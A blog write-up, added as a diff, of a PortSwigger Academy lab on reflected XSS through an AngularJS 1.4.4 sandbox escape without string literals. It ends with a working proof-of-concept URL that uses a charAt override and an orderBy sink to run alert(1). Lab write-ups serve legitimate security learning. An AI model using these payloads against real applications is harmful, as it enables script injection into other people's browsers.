@@ -1,0 +1,203 @@
+---
+layout: post
+title: "Portswigger Academy Writeup - Reflected XSS with AngularJS sandbox escape without strings"
+permalink: /:title/
+tags: [writeup, portswigger-academy, web-hacking]
+---
+
+<p>
+These days I&rsquo;m spending some time on the excellent suite of (free!) labs by Portswigger, the <a href="https://portswigger.net/web-security/getting-started">Portswigger Academy</a>. One of the good points of the academy is its terrific documentation,
+but for this particular lab I&rsquo;ve found that the solution attached to the lab is a bit too light in details. Therefore, I wanted to document a bit more what thoughts and experiments I&rsquo;ve done
+to get to the solution.
+</p>
+
+<div id="outline-container-org8766589" class="outline-2">
+<h2 id="org8766589">The Lab</h2>
+<div class="outline-text-2" id="text-org8766589">
+<p>
+You can find the lab <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings">here</a>. The app is using AngularJS, so the goal is to obtain Client Side Template Injection (CSTI) to execute the <code>alert</code> function. In this case, we have two main characteristics of the lab to consider:
+</p>
+
+<ol class="org-ol">
+<li>We cannot use the <code>$eval</code> function, so we need another sink to execute code.</li>
+<li>We can&rsquo;t use strings (no single and double quotes).</li>
+</ol>
+
+
+<p>
+Looking at the resources bundled in the lab, we immediately see that the AngularJS version bundled is 1.4.4, therefore we will also need to land a sandbox escape.
+With this in mind, there are three steps to perform in order to complete the lab:
+</p>
+
+<ol class="org-ol">
+<li>Find the injection point, that is, input that will be treated as an AngularJS expression.</li>
+<li>Escape the sandbox to access global built-in functions (like alert).</li>
+<li>Execute the code.</li>
+</ol>
+</div>
+
+<div id="outline-container-org6102360" class="outline-3">
+<h3 id="org6102360">Finding the injection point</h3>
+<div class="outline-text-3" id="text-org6102360">
+<p>
+We are presented with a search bar. The first thing that we try is to search something in the bar.
+</p>
+
+
+
+<div id="org451fa30" class="figure">
+<p><img src="../assets/img/20230808-100004_screenshot.png" alt="20230808-100004_screenshot.png" />
+</p>
+</div>
+
+<p>
+The visited path is <code>/?search=MYMARKER</code>. Looking at the source of the page, we notice that the body contains the attribute <code>ng-app</code> (so it&rsquo;s definitely using AngularJS) and that the section with the search result is produced by some angular code:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">&lt;section class=blog-header&gt;
+    &lt;script&gt;angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+        $scope.query = {};
+        var key = 'search';
+        $scope.query[key] = 'MYMARKER';
+        $scope.value = $parse(key)($scope.query);
+    });&lt;/script&gt;
+    &lt;h1 ng-controller=vulnCtrl&gt;0 search results for {%raw%}{{value}}{%endraw%}&lt;/h1&gt;
+    &lt;hr&gt;
+&lt;/section&gt;
+</pre>
+</div>
+
+<p>
+What is happening here? This is basically the code that handles a controller &#x2013; it populates the scope with two objects, <code>query</code> (a key-value mapping of the parameters inserted) and <code>value</code>. The $parse function called in the last line of the script, documented <a href="https://docs.angularjs.org/api/ng/service/$parse">here</a>, is basically the bread and butter of AngularJS: it takes an expression and compiles it into a function that produces the value. The function takes the context that the javascript code has access to, in this case, it is the simple <code>query</code> object populated before.
+</p>
+
+<p>
+Let&rsquo;s see $parse in action to better understand what happens behind the curtains. In the devtools, I&rsquo;ve placed a breakpoint on the line that actually calls it, so that I can use it in the console:
+</p>
+
+
+<div id="org0aa0d00" class="figure">
+<p><img src="../assets/img/20230808-100918_screenshot.png" alt="20230808-100918_screenshot.png" />
+</p>
+</div>
+
+<p>
+And now, we try to play a bit with the function:
+</p>
+
+
+
+<div id="orgc55c52e" class="figure">
+<p><img src="../assets/img/20230808-101040_screenshot.png" alt="20230808-101040_screenshot.png" />
+</p>
+</div>
+
+<p>
+As we expected, every expression is compiled into a different function, with the latter being more complex and calling a bunch of <code>ensureSafe</code> functions that probably make up the heart of the sandbox.
+</p>
+
+<p>
+So we know we can execute code if we control something that goes into <code>$parse</code>, but right now the only thing going to it is the &rsquo;search&rsquo; string, not under our control. Let&rsquo;s try adding another
+parameter to the search and inspect the result.
+</p>
+
+<p>
+Visited path: <code>/?search=test&amp;controlled-input=test</code>:
+</p>
+<div class="org-src-container">
+<pre class="src src-nil">&lt;script&gt;angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+    $scope.query = {};
+    var key = 'search';
+    $scope.query[key] = 'test';
+    $scope.value = $parse(key)($scope.query);
+    var key = 'controlled-input';
+    $scope.query[key] = 'test';
+    $scope.value = $parse(key)($scope.query);
+});&lt;/script&gt;
+&lt;h1 ng-controller=vulnCtrl&gt;3 search results for {%raw%}{{value}}{%endraw%}&lt;/h1&gt;
+</pre>
+</div>
+
+<p>
+By adding a parameter, we are able to control a string that goes into parse. This will be our point of injection.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org5dd5b64" class="outline-3">
+<h3 id="org5dd5b64">Escaping the sandbox</h3>
+<div class="outline-text-3" id="text-org5dd5b64">
+<p>
+We can use the technique detailed in <a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">this post</a>:
+</p>
+<div class="org-src-container">
+<pre class="src src-js"><span style="color: #98be65;">'a'</span>.constructor.<span style="color: #a9a1e1;">prototype</span>.charAt=[].join;
+</pre>
+</div>
+
+<p>
+But we are limited and we can&rsquo;t use strings. We can bypass it by noticing that the constructor of a string is a native <code>String()</code> constructor. We can obtain the same constructor by taking the return value of the <code>toString()</code> function, as shown here:
+</p>
+
+
+
+<div id="org8b638c9" class="figure">
+<p><img src="../assets/img/20230808-102604_screenshot.png" alt="20230808-102604_screenshot.png" />
+</p>
+</div>
+
+<p>
+The sandbox escaping technique thus becomes:
+</p>
+<div class="org-src-container">
+<pre class="src src-js">toString().constructor.<span style="color: #a9a1e1;">prototype</span>.charAt=[].join;
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org3997c01" class="outline-3">
+<h3 id="org3997c01">Execute payload code</h3>
+<div class="outline-text-3" id="text-org3997c01">
+<p>
+Normally, we would have used <code>$eval</code>, but in this lab it is undefined. We can again read a <a href="https://portswigger.net/research/dom-based-angularjs-sandbox-escapes">portswigger research post</a> to find another sink:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">[1]|orderBy:'x=alert(1)'
+</pre>
+</div>
+
+<p>
+Again, we need to find a way to produce the <code>'x=alert(1)'</code> string without using quotes. That can be done using the <code>String.fromCharCode</code> function. We will access the <code>String</code> constructor
+using the <code>toString()</code> again:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orge47c316" class="outline-3">
+<h3 id="orge47c316">PoC</h3>
+<div class="outline-text-3" id="text-orge47c316">
+<p>
+The complete exploit becomes the following path:
+<code>/?search=test&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)</code>
+</p>
+
+
+<div id="org72caa56" class="figure">
+<p><img src="../assets/img/20230808-110248_screenshot.png" alt="20230808-110248_screenshot.png" />
+</p>
+</div>
+
+<p>
+I feel there are still some unclear parts of this chain, but I discovered a bit more about AngularJS and the philosophy around sandbox escapes in the process of deconstructing the exploit, so I&rsquo;ll consider this dive a good thing.
+</p>
+</div>
+</div>
+</div>
